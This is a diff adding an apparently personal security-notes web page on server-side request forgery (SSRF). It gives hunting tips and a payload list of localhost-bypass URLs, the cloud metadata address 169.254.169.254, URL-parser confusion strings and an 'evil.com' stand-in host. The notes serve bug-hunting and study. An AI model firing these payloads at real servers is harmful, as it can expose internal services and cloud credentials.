@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Notes</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap" rel="stylesheet">
+    <link rel="apple-touch-icon" sizes="180x180" href="../../../apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="../../../favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="../../../favicon-16x16.png">
+    <link rel="manifest" href="../../../site.webmanifest">
+    <link rel="stylesheet"
+          href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.10.0/styles/github.min.css">
+    <link rel="stylesheet" type="text/css" href="../../../style.css">
+    <style>
+        pre {
+            position: relative;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            overflow: auto;
+        }
+        .zeroclipboard-container {
+            position: absolute;
+            top: 8px;
+            right: 8px;
+            display: flex;
+            align-items: center;
+        }
+        .ClipboardButton {
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 4px;
+            display: flex;
+            align-items: center;
+            outline: none;
+        }
+        .ClipboardButton svg {
+            fill: #6a737d;
+            width: 16px;
+            height: 16px;
+            transition: fill 0.2s;
+        }
+        .ClipboardButton:hover svg {
+            fill: #0366d6; 
+        }
+        .color-fg-success {
+            display: none; 
+            fill: #28a745; 
+        }
+    </style>
+</head>
+<body data-current-page="/application_security/vulnerabilities/SSRF/SSRF.html">
+    <header class="header">
+        <div class="header-content">
+            <a href="/" class="logo">
+                <img src="../../../favicon-32x32.png" alt="Logo">
+            </a>
+            <div class="search-bar">
+                <input type="text" name="search-bar" placeholder="Search..">
+            </div>
+        </div>
+    </header>
+    <div class="container">
+        <nav class="sidebar">
+            <div class="sidebar-content">
+                <div class="category">Application Security
+    <ul>
+        <li><a href="/application_security/OSWE_prep.html">OSWE Prep</a></li>
+        <li><a href="/application_security/authentication.html">Authentication</a></li>
+        <li><a href="/application_security/authorisation.html">Authorisation</a></li>
+        <li><a href="/application_security/recon.html">Recon</a></li>
+        <li class="expandable">Random
+            <ul>
+                <li><a href="/application_security/random/browser.html">Browser</a></li>
+                <li><a href="/application_security/random/improper_email_domain_validation.html">Improper Email Domain Validation</a></li>
+                <li><a href="/application_security/random/js_analysis.html">Js Analysis</a></li>
+                <li><a href="/application_security/random/live_hack_notes.html">Live Hack Notes</a></li>
+            </ul>
+        </li>
+        <li class="expandable">Vulnerabilities
+            <ul>
+                <li class="expandable">SSRF
+                    <ul>
+                        <li><a href="/application_security/vulnerabilities/SSRF/SSRF.html">SSRF</a></li>
+                        <li><a href="/application_security/vulnerabilities/SSRF/examples.html">Examples</a></li>
+                    </ul>
+                </li>
+                <li class="expandable">XSS
+                    <ul>
+                        <li><a href="/application_security/vulnerabilities/XSS/XSS.html">XSS</a></li>
+                        <li><a href="/application_security/vulnerabilities/XSS/XSS_cookie_manipulation_cross_domain_redirection.html">XSS Cookie Manipulation Cross Domain Redirection</a></li>
+                    </ul>
+                </li>
+                <li class="expandable">XXE
+                    <ul>
+                        <li><a href="/application_security/vulnerabilities/XXE/XXE.html">XXE</a></li>
+                    </ul>
+                </li>
+                <li class="expandable">Sql Injection
+                    <ul>
+                        <li><a href="/application_security/vulnerabilities/sql_injection/sql_injection.html">Sql Injection</a></li>
+                        <li><a href="/application_security/vulnerabilities/sql_injection/tools.html">Tools</a></li>
+                    </ul>
+                </li>
+                <li class="expandable">Traversal
+                    <ul>
+                        <li><a href="/application_security/vulnerabilities/traversal/path_traversal.html">Path Traversal</a></li>
+                    </ul>
+                </li>
+            </ul>
+        </li>
+    </ul>
+</div>
+<div class="category">Cloud
+    <ul>
+        <li class="expandable">AWS
+            <ul>
+                <li><a href="/cloud/AWS/ec2.html">Ec2</a></li>
+                <li>Security
+                </li>
+            </ul>
+        </li>
+    </ul>
+</div>
+<div class="category">Hacking
+    <ul>
+        <li><a href="/hacking/hashcat.html">Hashcat</a></li>
+        <li class="expandable">Fuzzing
+            <ul>
+                <li><a href="/hacking/fuzzing/ffuf.html">Ffuf</a></li>
+            </ul>
+        </li>
+    </ul>
+</div>
+<div class="category">Infrastructure
+    <ul>
+        <li><a href="/infrastructure/gau_alias_dilemma.html">Gau Alias Dilemma</a></li>
+        <li class="expandable">Networking
+            <ul>
+                <li><a href="/infrastructure/networking/dns.html">Dns</a></li>
+            </ul>
+        </li>
+        <li class="expandable">Servers
+            <ul>
+                <li><a href="/infrastructure/servers/ngrok.html">Ngrok</a></li>
+            </ul>
+        </li>
+    </ul>
+</div>
+<div class="category">Software Engineering
+    <ul>
+        <li><a href="/software_engineering/git.html">Git</a></li>
+        <li><a href="/software_engineering/github_actions.html">Github Actions</a></li>
+        <li class="expandable">Python
+            <ul>
+                <li><a href="/software_engineering/python/flask.html">Flask</a></li>
+            </ul>
+        </li>
+    </ul>
+</div>
+
+            </div>
+        </nav>
+        <main class="content">
+            <div class="content-category"><span class="category-part">APPLICATION SECURITY</span><span class="separator">›</span><span class="category-part">Vulnerabilities</span><span class="separator">›</span><span class="category-part">SSRF</span></div><h1 id="ssrf-server-side-request-forgery">SSRF (Server-Side Request Forgery)</h1>
+
+<h2 id="what-is-ssrf">What is ssrf?</h2>
+
+<p>SSRF is when an attacker manipulates the server into making requests, which can be internal services such as local host or AWS, as well as arbitrary external systems.</p>
+
+<h2 id="hunting-ssrf">Hunting ssrf</h2>
+
+<h3 id="url-parameters">URL parameters</h3>
+
+<p><code>url=</code>, <code>targetUrl=</code>, <code>requestUrl=</code>, <code>path=</code></p>
+
+<h3 id="api-webhooks">API, webhooks</h3>
+
+<p>Look for developer portal, e.g. developer.example.com, example.com/developer</p>
+
+<h3 id="open-redirects">Open redirects</h3>
+
+<p>Find open redirects and chain SSRF.</p>
+
+<pre><code class="language-xml">go
+return
+r_url
+returnUrl
+returnUri
+locationUrl
+goTo
+return_url
+return_uri
+ref=
+referrer=
+backUrl
+returnTo
+successUrl
+</code></pre>
+
+<h3 id="referer-header">Referer header</h3>
+
+<p>Simply set Referer: <a href="https://www.yourdomain.com" target="_blank">https://www.yourdomain.com</a> and start logging requests via your own private collaborator server.</p>
+
+<h3 id="pdf-generators">PDF generators</h3>
+
+<ul>
+<li>Can I inject HTML?</li>
+<li>Can I access remote servers?</li>
+<li>Can I execute JavaScript?</li>
+<li>Is the server that’s rendering my PDF cloud hosted?</li>
+<li>Are there any known vulnerabilities in the component that’s generating the PDF?</li>
+<li>What other services or systems can I interact with?</li>
+</ul>
+
+<p>Read: <a href="https://www.blackhillsinfosec.com/hunting-for-ssrf-bugs-in-pdf-generators/" target="_blank">Hunting for SSRF Bugs in PDF Generators</a></p>
+
+<h4 id="wkhtmlpdf">wkhtmlpdf</h4>
+
+<p>WebKit rendering engine to convert HTML and CSS into PDF documents.</p>
+
+<pre><code class="language-xml">&lt;iframe src=&quot;http://192.254.169.251/user-data&quot;&gt;
+</code></pre>
+
+<h2 id="payload">Payload</h2>
+
+<pre><code class="language-xml">http://127.0.0.1:80
+http://0.0.0.0:80
+http://localhost:80
+http://[::]:80/
+http://spoofed.burpcollaborator.net
+http://localtest.me
+http://customer1.app.localhost.my.company.127.0.0.1.nip.io
+http://mail.ebc.apple.com redirect to 127.0.0.6 == localhost
+http://bugbounty.dod.network redirect to 127.0.0.2 == localhost
+http://127.127.127.127
+http://2130706433/ = http://127.0.0.1
+http://[0:0:0:0:0:ffff:127.0.0.1]
+localhost:+11211aaa
+http://0/
+http://1.1.1.1 &amp;@2.2.2.2# @3.3.3.3/
+http://127.1.1.1:80\@127.2.2.2:80/
+http://127.1.1.1:80\@@127.2.2.2:80/
+http://127.1.1.1:80:\@@127.2.2.2:80/
+http://127.1.1.1:80#\@127.2.2.2:80/
+http://169.254.169.254
+0://evil.com:80;http://google.com:80
+</code></pre>
+
+            <a href="../../../index.html" class="back-link">
+                <svg xmlns="http://www.w3.org/2000/svg"
+                     class="icon"
+                     fill="none"
+                     viewBox="0 0 24 24"
+                     stroke-width="1.5"
+                     stroke="#6a737d"
+                     width="20"
+                     height="20">
+                    <path class="svg-path"
+                          stroke-linecap="round"
+                          stroke-linejoin="round"
+                          d="m11.25 9-3 3m0 0 3 3m-3-3h7.5M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0Z" />
+                </svg>
+            </a>
+        </main>
+    <aside class="toc-sidebar">
+    <div class="toc-container">
+        <ul id="toc-list">
+            <li><a href="#what-is-ssrf" data-target="what-is-ssrf">What is ssrf?</a></li>
+            <li><a href="#hunting-ssrf" data-target="hunting-ssrf">Hunting ssrf</a></li>
+            <li><a href="#payload" data-target="payload">Payload</a></li>
+        </ul>
+    </div>
+</aside></div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        const currentPage = document.body.getAttribute('data-current-page');
+        
+        document.querySelectorAll('.sidebar-content .expandable').forEach(item => {
+            const submenu = item.querySelector('ul');
+            if (submenu) {
+                submenu.style.display = 'none';
+            }
+        });
+        
+        document.querySelectorAll('.sidebar-content .expandable').forEach(item => {
+            item.addEventListener('click', function(e) {
+                if (e.target === this || (e.target.tagName !== 'A' && e.target.parentElement === this)) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    
+                    this.classList.toggle('expanded');
+                    
+                    const submenu = this.querySelector('ul');
+                    if (submenu) {
+                        if (submenu.style.display === 'block') {
+                            submenu.style.display = 'none';
+                        } else {
+                            submenu.style.display = 'block';
+                        }
+                    }
+                }
+            });
+        });
+        
+        if (currentPage) {
+            const currentLink = document.querySelector(`.sidebar-content a[href="${currentPage}"]`);
+            if (currentLink) {
+                currentLink.classList.add('active');
+                
+                document.querySelectorAll('.sidebar-content .expandable.expanded').forEach(item => {
+                    if (!item.contains(currentLink)) {
+                        item.classList.remove('expanded');
+                        const submenu = item.querySelector('ul');
+                        if (submenu) {
+                            submenu.style.display = 'none';
+                        }
+                    }
+                });
+                
+                let parent = currentLink.parentElement;
+                while (parent) {
+                    if (parent.classList && parent.classList.contains('expandable')) {
+                        parent.classList.add('expanded');
+                        parent.classList.add('has-active-child');
+                        const submenu = parent.querySelector('ul');
+                        if (submenu) {
+                            submenu.style.display = 'block';
+                        }
+                    }
+                    parent = parent.parentElement;
+                }
+                
+                setTimeout(() => {
+                    const sidebarElement = document.querySelector('.sidebar');
+                    const activeElement = currentLink;
+                    
+                    if (sidebarElement && activeElement) {
+                        const activeRect = activeElement.getBoundingClientRect();
+                        const sidebarRect = sidebarElement.getBoundingClientRect();
+                        const offsetTop = activeRect.top - sidebarRect.top;
+                        
+                        sidebarElement.scrollTop = offsetTop - (sidebarElement.clientHeight / 4);
+                    }
+                }, 100);
+            }
+        }
+
+        const tocLinks = document.querySelectorAll('#toc-list a');
+        const headings = Array.from(document.querySelectorAll('h2[id]'));
+        const contentContainer = document.querySelector('.content');
+        
+        if (tocLinks.length > 0 && headings.length > 0) {
+            tocLinks[0].classList.add('active');
+            
+            function updateToc() {
+                const scrollPosition = window.scrollY + 100; 
+                
+                let currentHeadingIndex = headings.length - 1;
+                
+                for (let i = 0; i < headings.length; i++) {
+                    if (headings[i].offsetTop > scrollPosition) {
+                        currentHeadingIndex = Math.max(0, i - 1);
+                        break;
+                    }
+                }
+                
+                if (currentHeadingIndex >= 0 && currentHeadingIndex < headings.length) {
+                    tocLinks.forEach(link => link.classList.remove('active'));
+                    
+                    const currentId = headings[currentHeadingIndex].id;
+                    const activeLink = document.querySelector(`#toc-list a[href="#${currentId}"]`);
+                    if (activeLink) {
+                        activeLink.classList.add('active');
+                    }
+                }
+            }
+            
+            window.addEventListener('scroll', updateToc);
+            
+            updateToc();
+            
+            tocLinks.forEach(link => {
+                link.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    
+                    const targetId = this.getAttribute('href').substring(1);
+                    const targetElement = document.getElementById(targetId);
+                    
+                    if (targetElement) {
+                        const targetPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
+                        
+                        window.scrollTo({
+                            top: targetPosition - 80, 
+                            behavior: 'smooth'
+                        });
+                        
+                        history.pushState(null, null, `#${targetId}`);
+                        
+                        tocLinks.forEach(l => l.classList.remove('active'));
+                        this.classList.add('active');
+                        
+                        e.stopPropagation();
+                    }
+                });
+            });
+        }
+        
+        document.querySelectorAll('pre code').forEach((block) => {
+            if (!block.parentNode.querySelector('.zeroclipboard-container')) {
+                const buttonContainer = document.createElement('div');
+                buttonContainer.className = 'zeroclipboard-container';
+
+                const button = document.createElement('button');
+                button.className = 'ClipboardButton';
+                button.setAttribute('aria-label', 'Copy');
+                button.setAttribute('role', 'button');
+
+                const copyIcon = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
+                copyIcon.setAttribute('aria-hidden', 'true');
+                copyIcon.className = 'copy-icon';
+                copyIcon.innerHTML = `
+                    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path>
+                    <path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+                `;
+
+                const checkIcon = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
+                checkIcon.className = 'color-fg-success';
+                checkIcon.setAttribute('aria-hidden', 'true');
+                checkIcon.innerHTML = `
+                    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+                `;
+                checkIcon.style.display = 'none'; 
+
+                button.appendChild(copyIcon);
+                button.appendChild(checkIcon);
+                buttonContainer.appendChild(button);
+                block.parentNode.appendChild(buttonContainer);
+
+                button.addEventListener('click', (e) => {
+                    e.stopPropagation();
+                    const code = block.innerText;
+                    navigator.clipboard.writeText(code).then(() => {
+                        copyIcon.style.display = 'none';
+                        checkIcon.style.display = 'inline';
+
+                        setTimeout(() => {
+                            copyIcon.style.display = 'inline';
+                            checkIcon.style.display = 'none';
+                        }, 1500);
+                    });
+                });
+            }
+        });
+    });
+</script>
+
+</body>
+</html>
